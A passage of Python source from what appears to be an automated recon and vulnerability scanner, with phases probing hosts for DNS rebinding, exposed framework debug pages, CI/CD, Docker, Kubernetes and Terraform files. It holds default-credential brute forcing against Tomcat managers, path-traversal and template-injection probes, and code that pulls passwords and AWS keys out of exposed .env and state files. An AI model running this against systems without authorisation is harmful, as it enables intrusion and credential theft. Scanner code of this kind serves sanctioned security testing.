    resolve_tasks = [loop.run_in_executor(None, _resolve_host, sub) for sub in random_subs]
    results = await asyncio.gather(*resolve_tasks)
    resolved_count = sum(1 for ips in results if ips)
    if resolved_count >= count * 0.8:
        sample_ips = ",".join(results[0]) if results[0] else "unknown"
        log("warn", f"119-WILDCARDDNS: wildcard DNS detected for {domain} — {resolved_count}/{count} random subdomains resolved")
        findings.append(f"[wildcard-detected] {domain} resolves_to={sample_ips} count={resolved_count}")
        for sub, ips in zip(random_subs, results):
            if ips:
                findings.append(f"  {sub} -> {','.join(ips)}")
    else:
        findings.append(f"[no-wildcard] {domain} — only {resolved_count}/{count} random subdomains resolved (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"119-WILDCARDDNS: {len(findings)} findings → {out}")
    return {"119-WILDCARDDNS": str(out), "count": len(findings)}


# ────────────────── Phase 120-DNSREBIND: DNS Rebinding Detection ─────────────


def _is_private_ip(ip: str) -> bool:
    """Check if an IP address falls within private/loopback ranges."""
    try:
        parts = [int(x) for x in ip.split(".")]
        if len(parts) != 4:
            return False
        return (
            parts[0] == 10
            or (parts[0] == 172 and 16 <= parts[1] <= 31)
            or (parts[0] == 192 and parts[1] == 168)
            or parts[0] == 127
            or parts[0] == 0
        )
    except (ValueError, IndexError):
        return False


async def phase_120_DNSREBIND(
    domain: str, outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet,
    prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"120-DNSREBIND"}:
        return {}
    _out = outdir / "dns_rebinding.txt"
    if _out.exists() and not force:
        return {"120-DNSREBIND": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 120-DNSREBIND: DNS rebinding detection")
    findings: List[str] = []
    loop = asyncio.get_event_loop()
    # First DNS query
    first_ips = await loop.run_in_executor(None, _resolve_host, domain)
    if not first_ips:
        findings.append(f"[dns-rebind] {domain} — could not resolve; skipping")
        out = ensure(_out)
        out.write_text("\n".join(findings) + ("\n" if findings else ""))
        log("ok", f"120-DNSREBIND: {len(findings)} findings → {out}")
        return {"120-DNSREBIND": str(out), "count": len(findings)}

    # Check for private IPs
    private_ips = [ip for ip in first_ips if _is_private_ip(ip)]
    if private_ips:
        for ip in private_ips:
            findings.append(f"[dns-private-ip] {domain} ip={ip}")
    else:
        findings.append(f"[dns-rebind] {domain} resolves to public IP(s): {','.join(first_ips[:5])}")

    # Second DNS query after short delay to check for alternating resolution
    await asyncio.sleep(2)
    second_ips = await loop.run_in_executor(None, _resolve_host, domain)
    if second_ips and second_ips != first_ips:
        first_private = any(_is_private_ip(ip) for ip in first_ips)
        second_private = any(_is_private_ip(ip) for ip in second_ips)
        if first_private != second_private:
            findings.append(
                f"[dns-rebind-suspect] {domain} first_ip={','.join(first_ips)} second_ip={','.join(second_ips)}"
            )
    if not findings:
        findings.append(f"[dns-rebind] {domain} — no DNS rebinding indicators detected (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"120-DNSREBIND: {len(findings)} findings → {out}")
    return {"120-DNSREBIND": str(out), "count": len(findings)}



async def phase_121_IISASPNET(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"121-IISASPNET"}:
        return {}
    _out = outdir / "iis_aspnet_findings.txt"
    if _out.exists() and not force:
        return {"121-IISASPNET": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 121-IISASPNET: probing IIS/ASP.NET hosts")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "121-IISASPNET: no hosts; skipping")
        return {"121-IISASPNET": str(_out), "count": 0}
    tech_file = outdir / "tech.txt"
    tech_lines = read_lines(tech_file) if tech_file.exists() else []
    for h in hosts:
        is_iis = False
        is_java = False
        for line in tech_lines:
            if h in line:
                if "iis" in line.lower() or "asp.net" in line.lower() or "microsoft-iis" in line.lower():
                    is_iis = True
                if "java" in line.lower() or "tomcat" in line.lower() or "jetty" in line.lower():
                    is_java = True
        if not is_iis:
            try:
                req = urllib.request.Request(h, headers=_extra_h)
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                server = resp_headers.get("Server", "")
                if "microsoft-iis" in server.lower() or "asp.net" in server.lower():
                    is_iis = True
            except Exception:
                pass
        if not is_iis and not is_java:
            continue
        if is_iis:
            for path in ("/web.config", "/Web.config"):
                try:
                    req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                    status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                    if status == 200 and len(body_bytes) > 50:
                        findings.append(f"[iis-webconfig] {h}")
                        break
                except Exception:
                    pass
            for path in ("/elmah.axd", "/trace.axd"):
                try:
                    req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                    status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                    if status == 200:
                        findings.append(f"[iis-debug] {h} path={path}")
                except Exception:
                    pass
            for payload in ("/..\\..\\web.config", "\\..\\..\\web.config"):
                try:
                    req = urllib.request.Request(h.rstrip("/") + payload, headers=_extra_h, method="GET")
                    status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                    if status == 200:
                        findings.append(f"[iis-traversal] {h} payload={payload}")
                except Exception:
                    pass
        if is_java:
            for path in ("/WEB-INF/web.xml", "/META-INF/MANIFEST.MF"):
                try:
                    req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                    status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                    if status == 200:
                        tag = "java-webxml" if "web.xml" in path else "java-manifest"
                        findings.append(f"[{tag}] {h}")
                except Exception:
                    pass
    if not findings:
        findings.append("[iis-webconfig] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"121-IISASPNET: {len(findings)} findings → {out}")
    return {"121-IISASPNET": str(out), "count": len(findings)}


async def phase_122_TOMCAT(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"122-TOMCAT"}:
        return {}
    _out = outdir / "tomcat_findings.txt"
    if _out.exists() and not force:
        return {"122-TOMCAT": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 122-TOMCAT: probing Tomcat hosts")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "122-TOMCAT: no hosts; skipping")
        return {"122-TOMCAT": str(_out), "count": 0}
    creds = [("tomcat", "tomcat"), ("admin", "admin"), ("tomcat", "s3cret")]
    for h in hosts:
        for path in ("/manager/html", "/host-manager/html"):
            for user, passwd in creds:
                b64 = base64.b64encode(f"{user}:{passwd}".encode()).decode()
                headers = {**_extra_h, "Authorization": f"Basic {b64}"}
                try:
                    req = urllib.request.Request(h.rstrip("/") + path, headers=headers, method="GET")
                    status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                    if status == 200:
                        findings.append(f"[tomcat-manager] {h} creds={user}:{passwd}")
                except Exception:
                    pass
        for path in ("/jmx-console/", "/invoker/JMXInvokerServlet"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[tomcat-jmx] {h}")
                    break
            except Exception:
                pass
        for path in ("/WEB-INF/classes/", "/META-INF/MANIFEST.MF"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[tomcat-manifest] {h} path={path}")
            except Exception:
                pass
        for path in ("/jenkins/", "/hudson/"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[tomcat-jenkins] {h}")
            except Exception:
                pass
    if not findings:
        findings.append("[tomcat-manager] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"122-TOMCAT: {len(findings)} findings → {out}")
    return {"122-TOMCAT": str(out), "count": len(findings)}


async def phase_123_NODEJS(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"123-NODEJS"}:
        return {}
    _out = outdir / "nodejs_findings.txt"
    if _out.exists() and not force:
        return {"123-NODEJS": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 123-NODEJS: probing Node.js/Express hosts")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "123-NODEJS: no hosts; skipping")
        return {"123-NODEJS": str(_out), "count": 0}
    tech_file = outdir / "tech.txt"
    tech_lines = read_lines(tech_file) if tech_file.exists() else []
    for h in hosts:
        is_node = False
        for line in tech_lines:
            if h in line and ("node" in line.lower() or "express" in line.lower()):
                is_node = True
                break
        if not is_node:
            try:
                req = urllib.request.Request(h, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                server = resp_headers.get("Server", "")
                if "node" in server.lower() or "express" in server.lower():
                    is_node = True
            except Exception:
                pass
        if not is_node:
            continue
        for path in ("/.env", "/package.json", "/node_modules/"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[nodejs-exposed] {h} path={path}")
            except Exception:
                pass
        for path in ("/_debug/", "/__debug/"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[nodejs-debug] {h} path={path}")
            except Exception:
                pass
        for param in ("q", "search", "name", "page"):
            for payload in ("<%= 7*7 %>", "#{7*7}"):
                url = h.rstrip("/") + f"?{param}={urllib.parse.quote(payload)}"
                try:
                    req = urllib.request.Request(url, headers=_extra_h, method="GET")
                    status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                    body_str = body_bytes.decode("utf-8", errors="replace")
                    if "49" in body_str or "7*7" in body_str:
                        findings.append(f"[nodejs-ssti] {url} param={param}")
                        break
                except Exception:
                    pass
    if not findings:
        findings.append("[nodejs-exposed] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"123-NODEJS: {len(findings)} findings → {out}")
    return {"123-NODEJS": str(out), "count": len(findings)}


async def phase_124_LARAVEL(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"124-LARAVEL"}:
        return {}
    _out = outdir / "laravel_exposure.txt"
    if _out.exists() and not force:
        return {"124-LARAVEL": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 124-LARAVEL: probing Laravel exposures")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "124-LARAVEL: no hosts; skipping")
        return {"124-LARAVEL": str(_out), "count": 0}
    for h in hosts:
        secrets_found = []
        for path in ("/.env", "/.env.backup", "/.env.local", "/.env.production"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    body_str = body_bytes.decode("utf-8", errors="replace")
                    exposed = []
                    for key in ("APP_KEY", "DB_PASSWORD", "AWS_SECRET"):
                        m = re.search(rf"^{key}=(.+)$", body_str, re.MULTILINE)
                        if m:
                            exposed.append(m.group(0))
                    if exposed:
                        secrets_found.append(f"{path}:{','.join(exposed)}")
                    else:
                        findings.append(f"[laravel-env] {h} path={path}")
            except Exception:
                pass
        if secrets_found:
            for entry in secrets_found:
                findings.append(f"[laravel-env] {h} path={entry.split(':')[0]} secrets={entry.split(':', 1)[1]}")
        try:
            req = urllib.request.Request(h.rstrip("/") + "/storage/logs/laravel.log", headers=_extra_h, method="GET")
            status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
            if status == 200:
                findings.append(f"[laravel-log] {h}")
        except Exception:
            pass
        for path in ("/telescope", "/horizon"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[laravel-dashboard] {h} path={path}")
            except Exception:
                pass
    if not findings:
        findings.append("[laravel-env] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"124-LARAVEL: {len(findings)} findings → {out}")
    return {"124-LARAVEL": str(out), "count": len(findings)}


async def phase_125_DJANGO(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"125-DJANGO"}:
        return {}
    _out = outdir / "django_exposure.txt"
    if _out.exists() and not force:
        return {"125-DJANGO": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 125-DJANGO: probing Django debug mode")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "125-DJANGO: no hosts; skipping")
        return {"125-DJANGO": str(_out), "count": 0}
    for h in hosts:
        for trigger_path in ("/nonexistent_page_xyz", "/admin/login/../../"):
            try:
                req = urllib.request.Request(h.rstrip("/") + trigger_path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                body_str = body_bytes.decode("utf-8", errors="replace")
                if "Django" in body_str and "Traceback" in body_str and "settings" in body_str.lower():
                    findings.append(f"[django-debug] {h}")
                    break
            except urllib.error.HTTPError as e:
                body_str = e.read().decode("utf-8", errors="replace")
                if "Django" in body_str and "Traceback" in body_str and "settings" in body_str.lower():
                    findings.append(f"[django-debug] {h}")
                    break
            except Exception:
                pass
        for path in ("/admin/", "/admin/login/"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[django-admin] {h} path={path}")
            except Exception:
                pass
        for path in ("/settings.py", "/local_settings.py"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[django-settings] {h} path={path}")
            except Exception:
                pass
        for api_path in ("/api/", "/api/v1/", "/api/v2/"):
            try:
                req = urllib.request.Request(h.rstrip("/") + api_path, headers={**_extra_h, "Accept": "text/html,application/json"}, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    body_str = body_bytes.decode("utf-8", errors="replace")
                    if "Django REST framework" in body_str or "Api" in body_str:
                        findings.append(f"[django-drf] {h}")
                        break
            except Exception:
                pass
    if not findings:
        findings.append("[django-debug] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"125-DJANGO: {len(findings)} findings → {out}")
    return {"125-DJANGO": str(out), "count": len(findings)}


async def phase_126_SYMFONY(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"126-SYMFONY"}:
        return {}
    _out = outdir / "symfony_profiler.txt"
    if _out.exists() and not force:
        return {"126-SYMFONY": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 126-SYMFONY: probing Symfony profiler")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "126-SYMFONY: no hosts; skipping")
        return {"126-SYMFONY": str(_out), "count": 0}
    for h in hosts:
        for path in ("/_profiler", "/_profiler/phpinfo", "/_profiler/router"):
            try:
                req = urllib.request.Request(h.rstrip("/") + path, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[symfony-profiler] {h} path={path}")
            except Exception:
                pass
        try:
            req = urllib.request.Request(h.rstrip("/") + "/_wdt", headers=_extra_h, method="GET")
            status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
            if status == 200:
                findings.append(f"[symfony-wdt] {h}")
        except Exception:
            pass
        try:
            req = urllib.request.Request(h.rstrip("/") + "/app_dev.php/_profiler", headers=_extra_h, method="GET")
            status, resp_headers, body_bytes = await _async_urlopen_no_redirect(_urlopen, req, timeout=10)
            if status == 200:
                findings.append(f"[symfony-profiler] {h} path=/app_dev.php/_profiler")
        except Exception:
            pass
    if not findings:
        findings.append("[symfony-profiler] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"126-SYMFONY: {len(findings)} findings → {out}")
    return {"126-SYMFONY": str(out), "count": len(findings)}



async def phase_127_CICD(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"127-CICD"}:
        return {}
    _out = outdir / "cicd_exposure.txt"
    if _out.exists() and not force:
        return {"127-CICD": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 127-CICD: CI/CD Pipeline File Exposure")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "127-CICD: no hosts; skipping")
        return {"127-CICD": str(_out), "count": 0}
    cicd_paths = [
        "/.gitlab-ci.yml", "/Jenkinsfile", "/.github/workflows/",
        "/.circleci/config.yml", "/.travis.yml", "/appveyor.yml",
        "/bitbucket-pipelines.yml", "/azure-pipelines.yml",
        "/buildspec.yml", "/cloudbuild.yaml",
    ]
    for host in hosts:
        for path in cicd_paths:
            url = f"https://{host}{path}"
            try:
                req = urllib.request.Request(url, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[cicd-file] {host} path={path}")
                    body_str = body_bytes.decode("utf-8", errors="replace")
                    if any(kw in body_str.lower() for kw in ("password", "secret", "token", "api_key", "aws_secret")):
                        findings.append(f"[cicd-secrets] {host} path={path} detail=Potential secrets in CI/CD file")
            except Exception:
                pass
        await _throttle_rate()
    if not findings:
        findings.append("[cicd-file] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"127-CICD: {len(findings)} findings \u2192 {out}")
    return {"127-CICD": str(out), "count": len(findings)}


async def phase_128_DOCKER(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"128-DOCKER"}:
        return {}
    _out = outdir / "docker_registry.txt"
    if _out.exists() and not force:
        return {"128-DOCKER": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 128-DOCKER: Docker Registry Exposure")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "128-DOCKER: no hosts; skipping")
        return {"128-DOCKER": str(_out), "count": 0}
    for host in hosts:
        registry_url = f"https://{host}/v2/"
        try:
            req = urllib.request.Request(registry_url, headers=_extra_h, method="GET")
            status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            if status in (200, 401):
                findings.append(f"[docker-registry] {host}")
                catalog_url = f"https://{host}/v2/_catalog"
                try:
                    cat_req = urllib.request.Request(catalog_url, headers=_extra_h, method="GET")
                    cat_status, cat_headers, cat_body = await _async_urlopen(_urlopen, cat_req, timeout=10)
                    if cat_status == 200:
                        cat_data = json.loads(cat_body)
                        images = cat_data.get("repositories", [])
                        if images:
                            findings.append(f"[docker-images] {host} images={','.join(images)}")
                except Exception:
                    pass
        except Exception:
            pass
        for path in ("/docker-compose.yml", "/Dockerfile"):
            url = f"https://{host}{path}"
            try:
                req = urllib.request.Request(url, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                if status == 200:
                    tag = "[docker-compose]" if path == "/docker-compose.yml" else "[dockerfile]"
                    findings.append(f"{tag} {host}")
            except Exception:
                pass
        await _throttle_rate()
    if not findings:
        findings.append("[docker-registry] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"128-DOCKER: {len(findings)} findings \u2192 {out}")
    return {"128-DOCKER": str(out), "count": len(findings)}


async def phase_129_K8S(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"129-K8S"}:
        return {}
    _out = outdir / "k8s_exposure.txt"
    if _out.exists() and not force:
        return {"129-K8S": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 129-K8S: Kubernetes Exposure")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "129-K8S: no hosts; skipping")
        return {"129-K8S": str(_out), "count": 0}
    api_endpoints = [
        ("/api/v1", "[k8s-api]"),
        ("/apis", "[k8s-api]"),
        ("/healthz", "[k8s-api]"),
        ("/version", "[k8s-api]"),
    ]
    for host in hosts:
        for endpoint, tag in api_endpoints:
            url = f"https://{host}:6443{endpoint}"
            try:
                req = urllib.request.Request(url, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"{tag} {host} endpoint={endpoint}")
            except Exception:
                pass
        kubelet_endpoints = ["/pods", "/stats/summary"]
        for ep in kubelet_endpoints:
            url = f"https://{host}:10250{ep}"
            try:
                req = urllib.request.Request(url, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[k8s-kubelet] {host} endpoint={ep}")
            except Exception:
                pass
        etcd_url = f"https://{host}:2379/v2/keys"
        try:
            req = urllib.request.Request(etcd_url, headers=_extra_h, method="GET")
            status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            if status == 200:
                findings.append(f"[k8s-etcd] {host}")
        except Exception:
            pass
        ro_kubelet_url = f"https://{host}:10255/pods"
        try:
            req = urllib.request.Request(ro_kubelet_url, headers=_extra_h, method="GET")
            status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            if status == 200:
                findings.append(f"[k8s-kubelet] {host} endpoint=/pods (read-only)")
        except Exception:
            pass
        dashboard_url = f"https://{host}/api/v1/namespaces/kube-system/services/kubernetes-dashboard"
        try:
            req = urllib.request.Request(dashboard_url, headers=_extra_h, method="GET")
            status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
            if status == 200:
                findings.append(f"[k8s-dashboard] {host}")
        except Exception:
            pass
        await _throttle_rate()
    if not findings:
        findings.append("[k8s-api] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"129-K8S: {len(findings)} findings \u2192 {out}")
    return {"129-K8S": str(out), "count": len(findings)}


async def phase_130_TERRAFORM(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"130-TERRAFORM"}:
        return {}
    _out = outdir / "terraform_exposure.txt"
    if _out.exists() and not force:
        return {"130-TERRAFORM": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 130-TERRAFORM: Terraform State File Exposure")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "130-TERRAFORM: no hosts; skipping")
        return {"130-TERRAFORM": str(_out), "count": 0}
    tf_paths = [
        "/terraform.tfstate", "/terraform.tfstate.backup",
        "/state/terraform.tfstate", "/infra/terraform.tfstate",
    ]
    aws_key_re = re.compile(r"AKIA[0-9A-Z]{16}")
    pwd_re = re.compile(r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"]?([^\s'\"&]+)")
    ip_re = re.compile(r"\b(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3})\b")
    token_re = re.compile(r"(?i)(token|api_key|secret)\s*[:=]\s*['\"]?([^\s'\"&]+)")
    for host in hosts:
        for path in tf_paths:
            url = f"https://{host}{path}"
            try:
                req = urllib.request.Request(url, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
                if status == 200:
                    findings.append(f"[terraform-state] {host} path={path}")
                    body_str = body_bytes.decode("utf-8", errors="replace")
                    for m in aws_key_re.finditer(body_str):
                        findings.append(f"[terraform-secrets] {host} type=AWS_ACCESS_KEY detail={m.group()}")
                    for m in pwd_re.finditer(body_str):
                        findings.append(f"[terraform-secrets] {host} type=PASSWORD detail={m.group(2)[:50]}")
                    for m in ip_re.finditer(body_str):
                        findings.append(f"[terraform-secrets] {host} type=PRIVATE_IP detail={m.group()}")
                    for m in token_re.finditer(body_str):
                        findings.append(f"[terraform-secrets] {host} type=API_TOKEN detail={m.group(2)[:50]}")
            except Exception:
                pass
        await _throttle_rate()
    if not findings:
        findings.append("[terraform-state] No findings (expected)")
    out = ensure(_out)
    out.write_text("\n".join(findings) + ("\n" if findings else ""))
    log("ok", f"130-TERRAFORM: {len(findings)} findings \u2192 {out}")
    return {"130-TERRAFORM": str(out), "count": len(findings)}


async def phase_131_ENVDEEP(
    outdir: Path, t: Tools, only: PhaseSet, skip: PhaseSet, prev: Dict[str, Any], force: bool = False,
) -> Dict[str, Any]:
    if skip & {"131-ENVDEEP"}:
        return {}
    _out = outdir / "env_files_found.txt"
    if _out.exists() and not force:
        return {"131-ENVDEEP": str(_out), "count": count_nonblank(_out)}
    log("info", "Phase 131-ENVDEEP: Deep Env File Scanning")
    findings: List[str] = []
    _urlopen = _get_urlopener()
    _extra_h = _extra_headers_dict()
    hosts_file = outdir / "hosts.txt"
    hosts = read_lines(hosts_file) if hosts_file.exists() else []
    if not hosts:
        log("warn", "131-ENVDEEP: no hosts; skipping")
        return {"131-ENVDEEP": str(_out), "count": 0}
    env_paths = [
        "/.env", "/.env.local", "/.env.dev", "/.env.staging",
        "/.env.production", "/.env.bak",
        "/env.js", "/config.js", "/config.json", "/config.yml",
        "/wp-config.php.bak", "/wp-config.php~", "/wp-config.php.old",
        "/database.yml", "/credentials.yml", "/secrets.yml",
    ]
    env_type_map = {
        "/.env": "env", "/.env.local": "env-local", "/.env.dev": "env-dev",
        "/.env.staging": "env-staging", "/.env.production": "env-prod",
        "/.env.bak": "env-bak",
        "/env.js": "env-js", "/config.js": "config-js",
        "/config.json": "config-json", "/config.yml": "config-yml",
        "/wp-config.php.bak": "wp-config-bak", "/wp-config.php~": "wp-config-swp",
        "/wp-config.php.old": "wp-config-old",
        "/database.yml": "database-yml", "/credentials.yml": "credentials-yml",
        "/secrets.yml": "secrets-yml",
    }
    secret_patterns = [
        (re.compile(r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"]?([^\s'\"&;]+)"), "password"),
        (re.compile(r"(?i)(api[_-]?key|api_key)\s*[:=]\s*['\"]?([^\s'\"&;]+)"), "api_key"),
        (re.compile(r"(?i)(secret)\s*[:=]\s*['\"]?([^\s'\"&;]+)"), "secret"),
        (re.compile(r"(?i)(token)\s*[:=]\s*['\"]?([^\s'\"&;]+)"), "token"),
        (re.compile(r"(?:mysql|postgres|mongodb|redis)://[^\s'\"&;]+"), "connection_string"),
        (re.compile(r"AKIA[0-9A-Z]{16}"), "aws_key"),
    ]
    for host in hosts:
        for path in env_paths:
            url = f"https://{host}{path}"
            try:
                req = urllib.request.Request(url, headers=_extra_h, method="GET")
                status, resp_headers, body_bytes = await _async_urlopen(_urlopen, req, timeout=10)
